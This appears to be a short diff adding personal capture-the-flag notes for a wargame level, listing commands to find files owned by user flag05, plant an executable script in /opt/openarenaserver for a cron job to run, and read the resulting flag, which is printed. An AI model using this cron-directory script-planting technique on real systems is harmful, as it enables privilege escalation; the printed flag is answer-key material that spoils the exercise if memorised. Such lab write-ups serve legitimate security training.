@@ -1,0 +1,11 @@
+Find files
+- find / -user flag05 2>/dev/null
+- cron job ?
+
+Make a script that will be run
+- echo "getflag > /tmp/flag05" > /opt/openarenaserver/myscript.sh
+- chmod +x /opt/openarenaserver/myscript.sh
+
+Wait auto exec
+- cat /tmp/flag05
+-> viuaaale9huek52boumoomioc
